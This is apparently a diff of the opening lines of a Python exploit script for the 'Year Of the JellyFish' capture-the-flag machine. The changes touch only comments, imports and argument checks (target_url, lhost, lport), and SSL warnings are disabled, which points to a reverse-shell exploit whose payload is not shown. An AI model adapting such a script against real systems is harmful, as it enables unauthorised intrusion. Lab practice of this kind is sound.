@@ -1,11 +1,13 @@
-## This a modified working script for the machine Year Of the JellyFish, 
+## This a modified working script for the machine Year Of the JellyFish
+# Added Lines: 8 and 10
+# Modified Lines: 20 ==> Added "verify=False" and cookies={'isHuman' : '1'}, line 23 ==> Modified the extension
 
 import requests
 import os
 import sys
-import urllib3
+import urllib3 #Added
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
 
 if len (sys.argv) != 4:
         print ("specify params in format: python " + sys.argv[0] + " target_url lhost lport")
